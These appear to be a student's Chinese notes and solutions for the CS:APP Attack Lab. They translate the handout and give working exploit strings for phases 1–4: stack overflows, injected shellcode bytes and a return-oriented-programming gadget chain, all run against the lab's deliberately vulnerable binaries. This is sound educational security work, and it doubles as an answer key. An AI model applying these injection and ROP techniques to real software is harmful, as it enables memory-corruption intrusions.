大部分是对文档(特别是对[attacklab.pdf](https://csapp.cs.cmu.edu/3e/attacklab.pdf))的翻译，解题过程会写在下面的代码框中


这个文档很乱 可能只有我自己看得懂
# readme.md
五次越来越困难的攻击来改变目标的行为

三次是用代码注入

两次是用“面向返回的编程”？


每次利用漏洞都涉及从标准输入读取一系列字节存储在堆栈上的缓冲区中

writeup对每个阶段和解决方案技术都有详细的说明 

# writeup(attacklab.pdf)
ctarget:易受代码注入攻击的可执行程序

rtarget:易受面向返回的编程攻击的可执行程序

cookie.txt:8位数的十六进制代码，将在攻击中使用它作为唯一标识符(？)

farm.c:使用它来生成面向返回的编程攻击？

hex2raw:生成攻击字符串的程序

执行hex2raw好像只能以管道符的方式，例如：

echo 11 22 33 | ./hex2raw

```cpp
//ctarget和rtarget都从标准输入读字符串
//它们使用getbuf函数执行此操作
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```
Gets函数类似于标准库的函数gets，它从标准输入中读取字符串(以'\n'或EOF中止)
，并将与null终止符一起存储在指定的目标。

函数Gets和gets无法确定它们的缓冲区是否足够大以存储它们读取的字符串，
它们只是复制字节序列，可能会超出在目的地分配的存储范围，
缓冲区溢出通常会导致程序状态损坏，从而导致内存访问错误。
你的任务是更巧妙地处理你提供给ctarget和rtarget的字符串，
让它们做更有趣的事情，这些被称为漏洞字符串。

利用漏洞攻击字符串的任何中间位置都不能包含字节值0x0a，因为这是换行符（'\n'）的ASCII代码。当Gets遇到此字节时，它将假定您打算终止该字符串

HEX2RAW要求两位十六进制值由一个或多个空格分隔。因此，如果您想创建一个十六进制值为0的字节，则需要将其写成00。要创建单词0xdeadbeef，您应该将“ef be ad de”传递给HEX2RAW（注意小端字节排序所需的反转）。
<img width="485" alt="image" src="https://github.com/RaDsZ2z/CSAPP/assets/129292565/8e92ee79-f760-430e-b0b1-43158fdfa659">

# phase1 (4.1 of attacklab.pdf)
<img width="489" alt="image" src="https://github.com/RaDsZ2z/CSAPP/assets/129292565/21cb3c2f-d12a-410e-bff5-8e923dc8c233">
getbuf在ctarget中由具有以下C代码的函数测试调用
```cpp
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```
当getbuf执行其返回语句时，程序通常会在test函数中恢复执行，我们想改变这种行为。
在文件ctarget中，存在具有以下C表示的函数touch1代码
```cpp
void touch1()
{
    vlevel = 1;
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0)
}
```
你的任务是让ctarget在getbuf执行其return语句时执行touch1的代码，而不是返回test函数

为该级别设计漏洞利用字符串所需的所有信息都可以通过检查反汇编版本的CTARGET来确定。使用objdump-d可以获得这个经过分解的版本。

•其想法是定位touch1起始地址的字节表示，以便getbuf代码末尾的ret指令将控制权转移到touch1。

•注意字节排序。

•您可能想使用GDB逐步完成getbuf的最后几条指令，以确保它做的是正确的事情。

•buf在getbuf堆栈帧中的位置取决于编译时的值

常量BUFFER_SIZE以及GCC使用的分配策略。您将需要检查反汇编的代码以确定其位置。

```cpp
解题过程：
先说一下call和ret指令会做什么事情
call fun:
把下一条指令的地址入栈(即push location)
然后把指令寄存器赋值为调用函数的地址(pc = location)
ret:
取出栈中的地址赋值给程序计数器PC(pop PC)

顺便说一下push和pop
push %rbx:
%rsp -= 0x8
(%rsp) = %rbx
pop %rbx:
%rbx = (%rsp)
%rsp += 0x8

所以 想要getbuf函数结束后 执行touch1函数
只需要改变调用getbuf时入栈的“下一条指令的位置”
它处于getbuf函数开头执行任何语句前%rsp指向的位置

所以，读入的字符串需要先占满低地址位置的0x28个字节
并放入值00000000004017c0(touch1函数的地址)
以使ret跳转到touch1函数

如果读入值 12 34 56
12是高字节位，会被放到低地址 排列顺序如下

56
34
12
(从下往上地址值变大)
所以一个可行的值是
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
c0 17 40 00
```

```shell
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 > tmp
cat tmp | ./hex2raw | ./ctarget -q
```
level1 完成


# phase2 (4.2)
```cpp
void touch2(unsigned val)
{
    vlevel = 2;
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n",val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n",val);
        fail2(2);
    }
    exit(0);
}
```
需要通过getbuf调用touch2函数并 使touch2函数的传入参数是 cookie

•您将希望以这样一种方式定位注入代码地址的字节表示，即getbuf代码末尾的ret指令将把控制权转移给它。

•回想一下，函数的第一个参数是在寄存器%rdi中传递的。

•您注入的代码应将寄存器设置为cookie，然后使用ret指令将控制权转移到touch2中的第一条指令。

•不要试图在利用漏洞的代码中使用jmp或调用指令。这些指令的目的地地址编码很难制定。使用ret指令进行所有控制权转移，即使您没有从呼叫返回。

•请参阅附录B中关于如何使用工具生成指令序列的字节级表示的讨论。
```cpp
//解题过程
需要让0x202ce2(%rip)  和  edi值相等
%rip程序计数器的值是下一条指令的地址(0x401802)
可以在缓冲区插入代码，代码执行完后调用touch2函数
插入的代码如下

mov $0x202ce2, %edi
add $0x401802, %edi
mov (%edi), %edi
push $0x4017ec
ret

对应的十六进制:
bf e2 2c 20 00
81 c7 02 18 40 00
67 8b 3f
68 ec 17 40 00
c3

上面这一段代码执行完之后会跳转到 0x4017ec
为了执行上面这段代码，要按照level1的方法
把getbuf函数的返回地址设置为这段代码的开头

gdb *0x40017ac
b getbuf
r -q
info r rsp
可以看到执行该函数时%rsp的值是
0x5561dc78
关于小端序
高字节数据会放到低地址，也就是前面的十六进制会放到低地址
而程序的执行是从低地址到高地址

所以答案
bf e2 2c 20 00 81 c7 02 
18 40 00 67 8b 3f 68 ec 
17 40 00 c3 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00

或者汇编指令/寄存器是 movq addq rdi
对应答案:
48 c7 c7 e2 2c 20 00 48 
81 c7 02 18 40 00 48 8b 
3f 68 ec 17 40 00 c3 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
将上面的十六进制数存为level2.txt然后
cat level2.txt | ./hex2raw | ./ctarget -q
```

# phase3 (4.3)

```cpp
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    //把val转换成16进制输出到s(显示8位)
    sprintf(s, "%.8x", val);
    //比较前9位 有一个字符串结束符所以比较8位
    return strncmp(sval, s, 9) == 0;
    
}

void touch3(char *sval){
    vlevel = 3;
    //输入的字符串要跟cookie值相同
    //gdb 但是根据汇编代码 gdb值是6044e4?
    //参数顺序rdi rsi 
    if(hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else{
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
401908 mov %rdi, %rsi
40190b mov 0x202bd3(%rip), %edi
401911 call 40184c <hexmatch>
需要调用touch3 使参数值等于 cookie 
而cookie值是 %(0x202bd3+0x401911)
由于gdb无法正常使用，具体值只能参考别人的博客了
插入的代码如下

movq 0x5561dca8, %rdi
pushq 0x4018fa
retq

对上面三行代码的解释：
0x5561dca8:getbuf函数使用的栈空间之前八个字节的起始地址
赋值给rdi会改变touch3函数的参数 sval指针的值
随后会将cookie值放入指针指向的地址

pushq 0x4018fa
ret
这两条语句会使movq指令执行完毕之后跳转到0x4018fa处继续执行指令
也就是转而执行touch3函数

48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
前两行是上面的三行汇编代码的十六进制表示，是注入的要执行的代码
第六行的作用是改变getbuf函数的返回地址
其返回到了栈空间，也就是我们注入的代码
movq 0x5561dca8, %rdi处

第七行的地址正是0x5561dca8 值是cookie的值
cookie的字符串值是 "0x59b997fa"
这在lab文件cookie.txt中有，但是好像没有信息明确指明它是用于此处的
此外用gdb应该也能查看cookie值(因为知道地址)但是我gdb用不了

将上面的十六进制数存为level3.txt然后
cat level3.txt | ./hex2raw | ./ctarget -q
```

# 面向返回的编程
先 objdump -d rtarget > rtarget.asm
生成可阅读的汇编代码

对rtarget使用代码注入攻击比对ctarget使用代码注入攻击难得多，因为它(rtarget)使用两种技术来阻止这种攻击

1. 它使用随机化，每次运行的堆栈位置不同，这使得无法确定注入代码的位置

2. 它将保存堆栈的内存部分标记为不可执行，因此即使将程序计数器设置为注入代码的开头，程序也会因为分段错误而失败

这意味着不能随心所欲地注入自己想执行的代码

但是可以从现有代码段中截取一些片段，这些片段可能是其他指令的编码

我们把这种“片段”称为“小工具”，例如
```cpp
void setval_210(unsigned *p)
{
    *p = 3347663060U;
}
对应的编码如下
400f15:c7 07 d4 48 89 c7 movl $0xc78948d4, (%rdi)
400f1b:c3                retq
其中的片段48 89 c7是 movq %rax, %rdi的编码
所以这里就包含一个起始地址为0x400f18的小工具，它执行的语句为
movq %rax, %rdi
retq
```
小工具场由函数start_farm和end_farm划分。不要试图从程序代码的其他部分构件小工具。
# phase4
要执行的攻击跟**phase2**相同，但是使用“小工具”在rtarget里完成。你可以使用由以下指令类型组成的小工具构成解决方案，并只使用前八个x86-64寄存器(%rax-%rdi)
1. movq 具体见图片3A
2. popq 具体见图片3B
3. ret  此指令由单字节0xc3编码
4. nop  由单字节指令0x90编码，它唯一的作用是使程序计数器+1

``` cpp
//前八个寄存器：
rax: 通常用来执行加法，函数调用的返回值一般也放在这里面
rbx: 数据存取
rcx: 通常用来作为计数器，比如for循环
rdx: 读写I/O端口时，edx用来存放端口号
rsp: 栈顶指针，指向栈的顶部
rbp: 栈底指针，指向栈的底部，通常用ebp+偏移量的形式来定位函数存放在栈中的局部变量
rsi: 字符串操作时，用于存放数据源的地址
rdi: 字符串操作时，用于存放目的地址的，和esi两个经常搭配一起使用，执行字符串的复制等操作
```
一些建议：
1. 需要的所有小工具都可以在由函数start_farm和mid_farm划分的rtarget代码区域中找到
2. 你只需要使用两个小工具即可进行此攻击
3. 当小工具使用popq指令时，它将从堆栈中弹出数据，因此，您的漏洞利用字符串将包含小工具的地址和数据的组合(?)
```cpp
在phase2中，有三行汇编代码
mov $0x202ce2, %edi
add $0x401802, %edi
mov (%edi), %edi
用gdb可以查看此处%edi即cookie的值是0x59b997fa
```
```cpp
小工具使用的逻辑如下
在栈中插入了如下代码
{
    1.返回地址
    getbuf函数的返回地址
    跳转到对应的地方执行代码
    这一段代码必定以ret结尾
    2.值
    如果1对应的地址处执行的代码包含了pop语句
    那么弹出栈的值就是此处的值
    (如果没有pop语句也就没有这个值)
    3.下一个小工具的地址
    因为1对应的地址处执行的代码以ret结尾
    此处的地址即为弹出栈并转跳的地址
    4. ...
}
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
存入level4.txt
cat level4.txt|./hex2raw|./rtarget -q
```

# phase5
先被文档劝退了一波，我由于不能正常使用gdb已经对attacklab兴致全无 这部分就不做了
